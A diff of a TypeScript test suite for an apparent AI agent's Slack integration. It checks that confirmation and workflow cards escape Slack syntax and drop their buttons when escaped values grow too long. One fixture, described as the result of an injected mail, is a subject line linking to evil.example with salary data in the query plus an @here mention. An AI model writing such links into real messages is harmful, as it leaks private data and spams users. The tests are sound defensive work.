@@ -32,7 +32,7 @@ import { slackApp, slackPostedUrl } from "./connect-providers.ts";
 import { mockIdp } from "./idp.ts";
 import { attacks, ordinary } from "./inert-answers.ts";
 import { saveInstructions } from "./instruction-saves.ts";
-import { greetingOf } from "./json-workflow-apps.ts";
+import { anyNamesOf, greetingOf } from "./json-workflow-apps.ts";
 import { mailConnection } from "./mail-connection.ts";
 import { fakeProvider } from "./model-provider.ts";
 import { signedInApi, unique } from "./sign-in.ts";
@@ -616,14 +616,14 @@ describe("a linked person's answer in Slack", () => {
 });
 
 /** A builder's workflow shared with `userId`, open to asking Stephen. */
-const askableWorkflow = async (userId: string) => {
+const askableWorkflow = async (userId: string, definition = greetingOf()) => {
   const builder = await signedInApi(idp, "builder");
   const by = await memberOf(env.DB, builder.userId);
   if (by === undefined) {
     throw new Error("Expected the builder to be a member");
   }
   const workflow = await createWorkflowResource(env, by, `ask-${unique()}`);
-  await publishDefinition(env, by, workflow.id, greetingOf());
+  await publishDefinition(env, by, workflow.id, definition);
   await shareWorkflowResource(env, by, workflow.id, {
     type: "person",
     id: userId,
@@ -694,32 +694,82 @@ describe("a workflow started from Slack", () => {
   });
 });
 
-describe("a linked person's held write in Slack", () => {
-  it("shows on its card each value as it will be sent, Slack's own syntax escaped", async () => {
-    const admin = await signedInApi(idp, "admin");
-    const mail = await mailConnection([], ["MAIL_SEND"]);
-    const binding = `MAIL${unique()}`.toUpperCase();
-    await requestGranted(idp, admin, {
-      subject: { type: "agent", agentId: chatAgentId },
-      object: { type: "connection", connectionId: mail.id },
-      actions: ["MAIL_SEND"],
-      binding,
-    });
-    // An injected mail had the model put a link and a mention in what it
-    // would send.
-    const subject = "<https://evil.example/?d=salary|Agenda> for <!here> & co";
-    const { slackUser } = await linkedPerson();
+describe("a workflow offered in Slack", () => {
+  it("is offered without Start where the card can't show a field in full once it is escaped, and with it where it can", async () => {
+    // Keys of `<&>`: 30 characters as written, 130 on the card as
+    // `&lt;&amp;&gt;` (inert.ts), past the 100 a label takes; and 21, 91
+    // on the card, which fit.
+    const cut = "<&>".repeat(10);
+    const fits = "<&>".repeat(7);
+    const { userId, slackUser } = await linkedPerson();
+    await askableWorkflow(userId, anyNamesOf());
     await fakeProvider(
       codeStep(
-        `export default async (self, env) => { await env.connections.call(${JSON.stringify(binding)}, "MAIL_SEND", ${JSON.stringify({ to: "ben@acme.test", subject })}); return "held"; };`
+        `export default async (self, env) => {
+  const [first] = await env.workflows.askable();
+  await env.workflows.offer(first.id, { ${JSON.stringify(cut)}: "Ada" });
+  return await env.workflows.offer(first.id, { ${JSON.stringify(fits)}: "Ada" });
+};`
       ),
-      says("It waits for you to confirm it.")
+      says("There are cards for it.")
     );
     const message = messageFrom(slackUser);
-    message.event.text = "Mail ben@acme.test the agenda.";
+    message.event.text = "Run the greeting for Ada";
     await post(message, { caught: false });
 
     const sent = await slackSawIn(message.event.channel);
+    const [offerLine = ""] = say("startOffer", "en", { workflow: "|" }).split(
+      "|"
+    );
+    const cards = sent
+      .map(({ fields }) => JSON.stringify(fields.blocks ?? ""))
+      .filter((blocks) => blocks.includes(offerLine));
+    expect(
+      cards.map((blocks) => ({
+        start: blocks.includes(startAction),
+        line: blocks.includes(say("startTooLong", "en")),
+      }))
+    ).toStrictEqual([
+      { start: false, line: true },
+      { start: true, line: false },
+    ]);
+  });
+});
+
+/**
+ * What reached Slack once a linked person's turn held a mail to Ben with
+ * `subject`, which the model wrote.
+ */
+const heldInSlack = async (subject: string) => {
+  const admin = await signedInApi(idp, "admin");
+  const mail = await mailConnection([], ["MAIL_SEND"]);
+  const binding = `MAIL${unique()}`.toUpperCase();
+  await requestGranted(idp, admin, {
+    subject: { type: "agent", agentId: chatAgentId },
+    object: { type: "connection", connectionId: mail.id },
+    actions: ["MAIL_SEND"],
+    binding,
+  });
+  const { slackUser } = await linkedPerson();
+  await fakeProvider(
+    codeStep(
+      `export default async (self, env) => { await env.connections.call(${JSON.stringify(binding)}, "MAIL_SEND", ${JSON.stringify({ to: "ben@acme.test", subject })}); return "held"; };`
+    ),
+    says("It waits for you to confirm it.")
+  );
+  const message = messageFrom(slackUser);
+  message.event.text = "Mail ben@acme.test the agenda.";
+  await post(message, { caught: false });
+  return await slackSawIn(message.event.channel);
+};
+
+describe("a linked person's held write in Slack", () => {
+  it("shows on its card each value as it will be sent, Slack's own syntax escaped", async () => {
+    // An injected mail had the model put a link and a mention in what it
+    // would send.
+    const sent = await heldInSlack(
+      "<https://evil.example/?d=salary|Agenda> for <!here> & co"
+    );
     const card = JSON.stringify(
       sent.find(({ fields }) => JSON.stringify(fields).includes(confirmAction))
         ?.fields ?? {}
@@ -738,6 +788,20 @@ describe("a linked person's held write in Slack", () => {
             fields.unfurl_links === "false" && fields.unfurl_media === "false"
         ),
     }).toStrictEqual({ shown: true, raw: false, previews: true });
+  });
+
+  it("is on a card without Confirm where a value fits as written but not once escaped", async () => {
+    // 3,500 bytes as written, 17,500 as `&amp;`: past what one card takes.
+    const sent = await heldInSlack("&".repeat(3500));
+    const card = JSON.stringify(
+      sent.find(({ fields }) =>
+        JSON.stringify(fields).includes(say("heldOne", "en"))
+      )?.fields ?? {}
+    );
+    expect({
+      confirm: card.includes(confirmAction),
+      said: card.includes(say("cardTooLong", "en")),
+    }).toStrictEqual({ confirm: false, said: true });
   });
 });
 
